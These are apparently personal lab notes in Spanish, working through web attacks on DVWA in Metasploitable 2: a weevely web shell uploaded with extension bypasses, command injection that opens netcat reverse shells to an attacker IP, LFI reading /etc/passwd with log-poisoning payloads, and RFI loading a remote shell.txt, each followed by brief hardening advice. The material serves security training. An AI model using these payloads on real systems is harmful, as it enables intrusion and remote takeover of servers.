# Vulnerabilidades carga de archivos

## Usamos Metasploitable 2

Entramos en la web de metasploitable 2 y vamos a DVWA

- user: admin
- password: password

Vamos a upload
- subimos una imagen 

`weevely`

`weevely generate 123456 /home/yintao/pentestingWeb/content/shell.php`

- subimos la shell en file upload --> your image was not uploaded
- bajamos la DVWA Secutiry a LOW
- Subimos la shell.php otra vez.
- comprobamos que este bien subida:
http://192.168.196.137/dvwa/hackable/uploads/shell.php
- Si no da 404 es que esta sbida correctamente. 

## Nos conectamos a la shell

`weevely http://192.168.196.137/dvwa/hackable/uploads/shell.php 123456`
~~~
whoami
id
uname -a
pwd
echo $SHELL
ls
help
~~~

- POST = datos ocultos
- GET = barra de navegador

## Burpsite

- Proxy-Options
- Firefox-Preferences-Network-Settings
- Manual configuration
* 127.0.0.1 8080
* Subimos la imagen y vemos la info en burpsite--> proxy-intercept

## Carga avanzada --> Seguridad Medium

- Probamos a subir la shell.php --> Your image was not uploaded.
- Probamos a subir la imagen --> OK
- Activamos proxy + burpsite: intercepet on
- Cambiamos el nombre de shell.php a shell.jpg --> `cp shell.php shell2.jpg`
- Subimos shell2.jpg 
- En intercept cambiamos la extension de shell2.jpg a shell2.php
- Nos conectamos con weevely:

`weevely http://192.168.196.137/dvwa/hackable/uploads/shell2.php 123456`

## Seguridad High
- Porbamos el paso Medium
- El filtro checkea la extension y el content type
- Cambiamos el nombre en intercept por --> shell3.php.jpg
- Nos conectamos con weevely:

`weevely http://192.168.196.137/dvwa/hackable/uploads/shell3.php.jpg 123456`

## Hardening

- Nunca permitir que los usuarios carguen ejecutables
- Verificar archivo y extension
- Analizar el archivo, volver a crearlo y cambiar su nombre

https://github.com/digininja/DVWA/blob/master/vulnerabilities/upload/source/impossible.php


# Vulnerabilidades de ejecución de código

### Security LOW
- Command execution en DVWA
- Probamos el formulario
- 8.8.8.8; pwd

`nc -vv -l -p 8080` --> kali

`8.8.8.8; nc -e /bin/bash 192.168.196.133 8080`

### Security MEDIUM
- Probamos 8.8.8.8;pwd --> no funciona
- 8.8.8.8 | pwd

`nc -vv -l -p 8080` --> kali

`8.8.8.8 | nc -e /bin/bash 192.168.196.133 8080`

## Hardening

- No usar funciones peligrosas
- Filtar contenido del input antes de la ejecución

Este codigo realiza las siguientes comprobaciones:
1. Elimina las | / con strip
2. Divide la ip en 4 octetos
3. Comprueba que cada octeto es un numero int
4. Si son 4 enteros los octetos vuele a escribir la ip.

```php
<?php

if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST["ip"];
    
    $target = stripslashes( $target );
    
    
    // Split the IP into 4 octects
    $octet = explode(".", $target);
    
    // Check IF each octet is an integer
    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {
    
    // If all 4 octets are int's put the IP back together.
    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
    
    
        // Determine OS and execute the ping command.
        if (stristr(php_uname('s'), 'Windows NT')) { 
    
            $cmd = shell_exec( 'ping  ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        
        } else { 
    
            $cmd = shell_exec( 'ping  -c 3 ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        
        }
    
    }
    
    else {
        echo '<pre>ERROR: You have entered an invalid IP</pre>';
    }
    
    
}

?> 
```

# Vulnerabilidades de inclusión local de archivos(LFI)

- DVWA --> file inclusion
- ?page=
- ?page=/../../../../../etc/passwd

- ?page=/../../../../../proc/self/environ
- Activamos burpsite y cambiamos user-agent
1. <?phpinfo()?;>
2. <?passthru('nc -e /bin/sh 192.168.136.234 9999');?>

`nc --vv -l -p 9999`

- ?page=/../../../../../var/log/auth.log
- ssh prueba@192.168.136.123
- ssh "<?passthru('nc -e /bin/sh 192.168.136.234 9999');?>"@192.168.136.123
- En burpsite vamos a Decoder
- nc -e /bin/sh 192.168.136.234 9999 --> base64
- ssh "<?passthru('BASE64');?>"@192.168.136.123
- ssh "<?passthru(BASE64_DECODE('BASE64'));?>"@192.168.136.123

# Vulnerabilidades Inclusión remota de archivos(RFI)
- Similar inclusion local de archivos
- Permite leer cualquier archivo 
- Ejecuta PHP desde otros servidores
- Almacenar php como .txt

### LOW Security
`service apache2 start`

creamos shell.txt
~~~
<?php
passthru("nc -e /bin/sh 192.168.196.133 8888");
?>
~~~

`cp shell.txt /var/www/html` 

`nc -vv -l -p 8888`

http://192.168.196.137/dvwa/vulnerabilities/fi/?page=http://192.168.196.133/shell.txt

### MEDIUM Security
hTTp://192.168.196.137/dvwa/vulnerabilities/fi/?page=http://192.168.196.133/shell.txt
- Esta filtrando por https y http

## Hardening
- Deshabilitar allow_url_fopen y allow_url_include --> OFF
- Inclusion de archivos estáticos

`nano /etc/php5/cgi/php.ini`

~~~
if ($file != "include.php") {
    echo "ERROR: File not found!";
    exit
}
~~~

